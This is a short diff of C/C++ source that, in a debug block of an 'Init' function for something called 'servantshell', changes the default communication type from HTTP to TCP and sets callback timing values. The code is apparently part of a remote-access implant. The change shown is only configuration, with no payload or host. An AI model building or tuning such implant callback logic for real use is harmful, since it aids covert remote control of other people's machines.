@@ -225,7 +225,7 @@ SHELL_API BOOL Init(BOOL bWait)
 
 	debugLog(_T("init servantshell. filepath is %s%s"), GetBinFilepath(), GetBinFilename());
 #ifdef _DEBUG
-	g_ConfigInfo.nDefaultCommType = COMMNAME_HTTP;
+	g_ConfigInfo.nDefaultCommType = COMMNAME_TCP;
 	g_ConfigInfo.nFirstConnectHour = -1;
 	g_ConfigInfo.nFirstConnectMinute = -1;
 	g_ConfigInfo.nTryConnectIntervalM = 1;
